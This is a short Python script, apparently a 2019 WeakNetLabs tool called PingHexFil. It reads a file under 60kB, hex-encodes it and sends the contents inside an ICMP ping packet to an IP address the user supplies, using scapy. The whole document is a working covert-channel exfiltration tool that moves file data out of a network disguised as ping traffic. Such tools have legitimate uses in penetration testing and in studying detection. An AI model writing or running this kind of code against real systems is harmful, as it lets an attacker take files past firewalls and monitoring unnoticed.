#!/usr/bin/python
# Let's ping.
# 2019 WeakNetLabs@Gmail.com, Douglas Berdeaux
# super specific here:
from sys import argv
from scapy.layers.inet import IP,ICMP
from scapy.sendrecv import send
from sys import exit
import re
import binascii # bytes to hex for file input
usage="\nPingHexFil - 2019 WeakNetLabs\n\n Usage: ./ping.py IP ADDRESS) (FILE NAME)\n  - File must be less than 60kB in size.\n"
fileData = "" # read in file and send via ping, less than 60kB
# finally, the workflow:
if (len(argv)<3): # we require an IP
	print usage
	exit(1)
# Read file into a hex string:
print "[+] Opening file: "+argv[2]
with open(argv[2],'rb') as byte:
	hexByte = byte.read()
	fileData += binascii.hexlify(hexByte)
# Use regexp for validation:
if (len(fileData)>60000):
	print usage;
	exit(1) # send 1 to shell, error
print "[+] Sending data as: "+fileData
if (re.search("^([12]?[0-9]?[0-9]+\.){3}[12]?[0-9]?[0-9]+$",argv[1])):
	send(IP(dst=argv[1])/ICMP()/fileData)
else: # whoops. That wasn't an IP:
	print usage;
print "Exiting." # done.
